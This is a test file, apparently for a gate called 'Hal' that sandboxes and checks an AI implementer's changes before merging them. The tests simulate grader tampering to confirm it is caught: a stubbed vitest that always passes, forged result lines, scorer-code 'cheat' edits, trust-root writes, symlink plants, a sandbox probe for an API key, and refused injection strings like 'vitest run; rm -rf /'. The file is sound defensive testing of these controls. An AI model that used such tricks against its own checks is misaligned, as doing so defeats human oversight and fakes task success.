    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { controls: () => result([]) } })), old, /no controls checks/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { controls: () => node('process.exit(1)') } })), old, /controls hyperline failed/);
  });

  it('a check that rewrites a game file (and leaves an ignored dist/x.js) is caught before the next check: tampered between checks', async () => {
    const old = halHead();
    const c = ctx({ cmds: { test: () => [node(`const fs = require('fs'); fs.writeFileSync('games/hyperline/game.js', "export const k = '${KEY}';\\n"); fs.mkdirSync('dist'); fs.writeFileSync('dist/x.js', 'x')`)] } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /^tampered between checks$/); // caught by the guard before typecheck
  });

  it('an ignored file one check leaves behind is gone before the next check runs', async () => {
    const c = ctx({ cmds: {
      test: () => [node(`require('fs').mkdirSync('dist', { recursive: true }); require('fs').writeFileSync('dist/x.js', 'feed the next check')`)],
      typecheck: () => [node(`process.exit(require('fs').existsSync('dist/x.js') ? 1 : 0)`)],
    } });
    expect((await runCandidate(ticket(), c)).verdict).toBe('merged');
  });

  it('the parts of one script share ignored output (tsc -b emits dist/, tsc -p reads it); the next script does not', async () => {
    const c = ctx({ cmds: {
      typecheck: () => [
        node(`require('fs').mkdirSync('dist', { recursive: true }); require('fs').writeFileSync('dist/x.d.ts', 'export {}')`),
        node(`process.exit(require('fs').existsSync('dist/x.d.ts') ? 0 : 1)`),
      ],
      score: (_d, s) => { const b = BEFORE[s as keyof typeof BEFORE]; return result({ ...b, fitness: b.fitness + 1 }, `if (require('fs').existsSync('dist/x.d.ts')) process.exit(3)`); },
    } });
    const r = await runCandidate(ticket(), c);
    expect(r.reasons).toEqual([]);
    expect(r.verdict).toBe('merged');
  });

  it('the last check (the after shot) touching the tree is caught too', async () => {
    const old = halHead();
    let n = 0;
    const c = ctx({ cmds: { shoot: (_d, _g, out) => result({ ok: true }, `${writeJpeg(out, fakeJpeg(390, 844))};${n++ === 1 ? "require('fs').writeFileSync('games/hyperline/game.js', 'x')" : ''}`) } });
    expectDiscarded(await runCandidate(ticket(), c), old, /tampered between checks/);
  });

  it('a symlink planted where the before shot goes is never followed: the tree check catches it, the target stays untouched', async () => {
    const old = halHead();
    const target = join(repo, 'planted-target.jpg');
    const dest = join(repo, '.data/hal/wt/HAL-1/docs/hal/history/hyperline/2026-11-11/HAL-1-before.jpg');
    let n = 0;
    const c = ctx({ cmds: { shoot: (_d, _g, out) => result({ ok: true }, `${writeJpeg(out, fakeJpeg(390, 844))};${n++ === 1 ? `require('fs').symlinkSync(${J(target)}, ${J(dest)})` : ''}`) } });
    expectDiscarded(await runCandidate(ticket(), c), old, /tampered between checks/);
    expect(existsSync(target)).toBe(false);
  });

  it('a before shot that is a symlink (not a regular file in Hal\'s private dir) is refused', async () => {
    const old = halHead();
    const real = join(repo, 'real.jpg');
    writeFileSync(real, fakeJpeg(390, 844));
    let n = 0;
    const c = ctx({ cmds: { shoot: (_d, _g, out) => (n++ === 0 ? result({ ok: true }, `require('fs').symlinkSync(${J(real)}, ${J(out)})`) : result({ ok: true }, writeJpeg(out, fakeJpeg(390, 844)))) } });
    expectDiscarded(await runCandidate(ticket(), c), old, /not a regular file/);
  });

  it('a write through the worktree\'s node_modules into the trust root is caught: trust root modified, with a warning', async () => {
    const old = halHead();
    put(repo, 'node_modules/somepkg/package.json', '{"name":"somepkg"}\n');
    put(repo, 'node_modules/vitest/vitest.mjs', '// real\n');
    const viaImplementer = await runCandidate(ticket(), ctx({}, (cwd) => {
      put(cwd, 'games/hyperline/game.js', 'export const speed = 6;\n');
      writeFileSync(join(cwd, 'node_modules/vitest/vitest.mjs'), 'process.exit(0) // stub\n'); // follows the symlink
    }));
    expectDiscarded(viaImplementer, old, /^trust root modified$/);
    expect(viaImplementer.warnings?.join(' ')).toMatch(/trust root modified: .*node_modules changed during HAL-1; reinstall/);
    put(repo, 'node_modules/vitest/vitest.mjs', '// real\n');
    // A check doing it (possible only unsandboxed, as here) is caught at the next guard.
    const viaCheck = await runCandidate(ticket(), ctx({ cmds: { test: () => [node(`require('fs').writeFileSync('node_modules/somepkg/package.json', '{"name":"evil"}')`)] } }));
    expectDiscarded(viaCheck, old, /^trust root modified$/);
  });

  it('forged results are rejected: a second result line, or a line without this check\'s nonce', async () => {
    const old = halHead();
    const two = (_d: string, s: string) => node(`console.log('HAL-RESULT ' + process.env.HAL_CHECK_NONCE + ' ' + ${J(J(BEFORE.hyperline))}); console.log('HAL-RESULT ' + process.env.HAL_CHECK_NONCE + ' ' + ${J(J({ ...BEFORE.hyperline, fitness: 99 }))}); void ${J(s)}`);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { score: two } })), old, /2 result lines/);
    const forged = () => node(`console.log('HAL-RESULT deadbeef ' + ${J(J({ ...BEFORE.hyperline, fitness: 99 }))})`);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { score: forged } })), old, /wrong nonce/);
    expect(() => parseResult('HAL-RESULT abc {"a":1}', 'abc')).not.toThrow();
    expect(parseResult<{ a: number }>('x\nHAL-RESULT abc {"a":1}\n', 'abc')).toEqual({ a: 1 });
    expect(() => parseResult('HAL-RESULT  {"a":1}', '')).toThrow(/nonce/);
  });

  it('a stubbed vitest in the worktree changes nothing: Hal runs its own, and node_modules is rebuilt before each check', async () => {
    const old = halHead();
    symlinkSync(join(import.meta.dirname, '..', '..', 'node_modules'), join(repo, 'node_modules'));
    const c = ctx({ cmds: { test: undefined as unknown as CheckCommands['test'] } }, (cwd) => {
      put(cwd, 'games/hyperline/game.js', 'export const speed = 5;\n');
      const nm = join(cwd, 'node_modules');
      rmSync(join(nm, '.bin'), { recursive: true, force: true });
      put(nm, '.bin/vitest', '#!/bin/sh\nexit 0\n');
      execFileSync('chmod', ['+x', join(nm, '.bin/vitest')]);
      rmSync(join(nm, 'vitest'), { recursive: true, force: true });
      put(nm, 'vitest/vitest.mjs', 'process.exit(0);\n');
      put(nm, 'vitest/package.json', '{"name":"vitest","type":"module","bin":{"vitest":"vitest.mjs"}}\n');
    });
    delete c.commands!.test; // the real `npm test` script (vitest run games), with Hal's vitest
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /npm test failed[\s\S]*REAL-FAILURE-SEEN/);
  }, 60_000);

  it('history shots must be 390x844 JPEGs', async () => {
    const old = halHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { shoot: (_d, _g, out) => result({ ok: true }, writeJpeg(out, Buffer.from('PNG nope'))) } })), old, /before shot is not a JPEG/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { shoot: (_d, _g, out) => result({ ok: true }, writeJpeg(out, fakeJpeg(780, 1688))) } })), old, /before shot is 780x1688, not 390x844/);
    let n = 0;
    const afterBad = ctx({ cmds: { shoot: (_d, _g, out) => result({ ok: true }, writeJpeg(out, n++ === 0 ? fakeJpeg(390, 844) : Buffer.from('x'))) } });
    expectDiscarded(await runCandidate(ticket(), afterBad), old, /after shot is not a JPEG/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { shoot: () => node(`console.error('shot failed ${KEY}'); process.exit(1)`) } })), old, /before shot failed: exit 1: shot failed \[REDACTED\]/);
  });

  it('a squash failure leaves refs/hal/main at its old HEAD and its worktree clean', async () => {
    const old = halHead();
    const failing: GitRunner = async (args, cwd, o) => { gitSubs.push(sub(args)!); if (sub(args) === 'update-ref') throw new Error('ref update failed'); return runGit(args, cwd, o); };
    const r = await runCandidate(ticket(), ctx({ git: failing }));
    expect(r.verdict).toBe('discarded');
    expect(r.reasons.join('\n')).toMatch(/squash merge failed: .*ref update failed/);
    expect(halHead()).toBe(old);
    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
    expect(gitIn(mainDir, 'status', '--porcelain', '--untracked-files=all')).toBe('');
    worktreesGone();
  });

  it('a thrown error anywhere is a discard, and the worktree and branch are still removed', async () => {
    const old = halHead();
    let n = 0;
    const throwing: GitRunner = async (args, cwd, o) => { if (sub(args) === 'write-tree' && n++ === 0) throw new Error('disk on fire'); return runGit(args, cwd, o); };
    expectDiscarded(await runCandidate(ticket(), ctx({ git: throwing })), old, /error: .*disk on fire/);
  });

  it('a game slug that is not a plain name, or not a game in the repo, is discarded before anything runs', async () => {
    const old = halHead();
    expectDiscarded(await runCandidate(ticket({ game: '../etc' }), ctx()), old, /bad game/);
    expectDiscarded(await runCandidate(ticket({ game: 'nosuch' }), ctx()), old, /bad game/);
    expect(calls).toHaveLength(0);
  });

  it('without sandbox-exec (and without the test-only flag) it fails closed: no sandbox', async () => {
    const old = halHead();
    const real = process.platform;
    Object.defineProperty(process, 'platform', { value: 'linux' }); // also covers running nested (HAL_SANDBOXED=1)
    try {
      expectDiscarded(await runCandidate(ticket(), ctx({ unsandboxedForTests: false })), old, /^no sandbox$/);
    } finally { Object.defineProperty(process, 'platform', { value: real }); }
    expect(calls).toHaveLength(0);
  });

  it.runIf(sandboxAvailable())('darwin: the checks really run sandboxed (no .hal.env, no network, no key, no writes outside)', async () => {
    const old = halHead();
    put(repo, '.hal.env', `ANTHROPIC_API_KEY=${KEY}\n`);
    // Real node_modules so the sandboxed `vitest list` (the tripwires' test count) runs in the worktree.
    symlinkSync(join(import.meta.dirname, '..', '..', 'node_modules'), join(repo, 'node_modules'));
    const escape = `/private/tmp/hal-sbx-escape-${process.pid}.txt`; // outside the worktree and os.tmpdir()
    const probe = node(`
      const fs = require('fs'), net = require('net');
      const out = [];
      try { fs.readFileSync(${J(join(repo, '.hal.env'))}); out.push('read:OK'); } catch (e) { out.push('read:' + e.code); }
      try { fs.writeFileSync(${J(escape)}, 'x'); out.push('write:OK'); } catch (e) { out.push('write:' + e.code); }
      out.push('key:' + (process.env.ANTHROPIC_API_KEY ? 'SET' : 'none'));
      try { fs.writeFileSync('node_modules/stub.js', 'x'); out.push('nm:OK'); } catch (e) { out.push('nm:' + e.code); }
      const s = net.connect(80, '10.255.255.1');
      s.on('connect', () => { out.push('net:OK'); done(); });
      s.on('error', (e) => { out.push('net:' + e.code); done(); });
      function done() { console.log('PROBE ' + out.join(' ')); process.exit(1); }`);
    const prev = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = KEY;
    try {
      const { countTests: _drop, ...c } = ctx({ unsandboxedForTests: false, cmds: { test: () => [probe] } });
      void _drop;
      const r = await runCandidate(ticket(), c);
      expectDiscarded(r, old, /npm test failed[\s\S]*PROBE read:EPERM write:EPERM key:none nm:EPERM net:EPERM/);
      expect(existsSync(escape)).toBe(false);
    } finally {
      rmSync(escape, { force: true }); if (prev === undefined) delete process.env.ANTHROPIC_API_KEY; else process.env.ANTHROPIC_API_KEY = prev; }
  }, 60_000);

  describe('score broker (the implementer asks Hal to score mid-build)', () => {
    const fastAsk = { pollMs: 10, timeoutMs: 20_000 };
    it('scores a snapshot of the worktree as it is at that moment, with the gate\'s score command, and cleans up', async () => {
      const seen: string[] = [];
      let asked: unknown, scoreDir = '';
      const c = ctx({
        cmds: { score: (d, s) => { seen.push(`${s}:${readFileSync(join(d, 'games/hyperline/game.js'), 'utf8').trim()}`); return passing.score(d, s); } },
        claude: async (call) => {
          calls.push(call);
          scoreDir = call.scoreDir!;
          put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.1;\n');
          asked = await askHalToScore(scoreDir, 'hyperline', fastAsk);
          put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
          return { first: ok(OUT) };
        },
      });
      const r = await runCandidate(ticket(), c);
      expect(r.verdict).toBe('merged');
      expect((asked as ScoreReport<unknown>).fitness).toBe(BEFORE.hyperline.fitness + 1);
      // The mid-build score saw 1.1; the gate's own score (step 6) then saw the final 1.2.
      expect(seen).toEqual(['hyperline:export const speed = 1.1;', 'hyperline:export const speed = 1.2;']);
      expect(r.scoreRequests).toBe(1);
      expect(scoreDir).not.toBe('');
      expect(existsSync(scoreDir)).toBe(false);
      expect(existsSync(join(repo, '.data/hal/tmp/HAL-1'))).toBe(false);
      worktreesGone();
    });

    it('refuses to score when the scorer code differs from main', async () => {
      let err = '';
      const c = ctx({
        claude: async (call) => {
          calls.push(call);
          put(call.cwd, 'scripts/hal/gearhold-play.ts', 'export const cheat = 1;\n');
          try { await askHalToScore(call.scoreDir!, 'hyperline', fastAsk); } catch (e) { err = String((e as Error).message); }
          return { first: ok(OUT) };
        },
      });
      const r = await runCandidate(ticket(), c);
      expect(err).toMatch(/scripts\/hal differs from main/);
      expect(r.verdict).toBe('discarded'); // and the tripwires still reject the edit itself
    });

    it('only scores the ticket game\'s own scorers', async () => {
      let err = '';
      const c = ctx({
        claude: async (call) => {
          calls.push(call);
          put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
          try { await askHalToScore(call.scoreDir!, 'gearhold-play', fastAsk); } catch (e) { err = String((e as Error).message); }
          return { first: ok(OUT) };
        },
      });
      await runCandidate(ticket(), c);
      expect(err).toMatch(/unknown scorer "gearhold-play".*hyperline/);
    });
  });
});

describe('default commands', () => {
  const tools = { node: '/n', vitest: '/r/vitest.mjs', tsc: '/r/tsc', tsx: '/r/tsx.mjs' };
  it('runs package.json scripts with Hal\'s tools (vitest run gets --no-cache), and check-entry from the tree', () => {
    expect(scriptArgv('vitest run', tools)).toEqual([['/n', '/r/vitest.mjs', 'run', '--no-cache']]);
    expect(scriptArgv('tsc -b packages/core packages/sdk && tsc -p scripts', tools)).toEqual([['/n', '/r/tsc', '-b', 'packages/core', 'packages/sdk'], ['/n', '/r/tsc', '-p', 'scripts']]);
    const d = defaultCommands(tools, { test: 'vitest run', typecheck: 'tsc -p scripts' });
    expect(d.score('/wt', 'hyperline')).toEqual(['/n', '/r/tsx.mjs', '/wt/scripts/hal/check-entry.ts', 'score', 'hyperline']);
    expect(d.shoot('/wt', 'g', '/o.jpg')).toEqual(['/n', '/r/tsx.mjs', '/wt/scripts/hal/check-entry.ts', 'shoot', 'g', '/o.jpg']);
  });
  it('refuses anything shell-like or another binary', () => {
    for (const bad of ['vitest run | tee x', 'vitest run; rm -rf /', 'vitest "run"', 'node x.js', 'vitest run & sleep 1', 'tsc $(x)']) expect(() => scriptArgv(bad, tools), bad).toThrow();
    expect(() => defaultCommands(tools, {}).test('/wt')).toThrow(/no test script/);
  });
  it('matches the real package.json', () => {
    const pkg = JSON.parse(readFileSync(join(import.meta.dirname, '..', '..', 'package.json'), 'utf8')) as { scripts: Record<string, string> };
    expect(() => defaultCommands(tools, pkg.scripts).test('/wt')).not.toThrow();
    expect(defaultCommands(tools, pkg.scripts).typecheck('/wt').length).toBeGreaterThanOrEqual(1);
  });
});
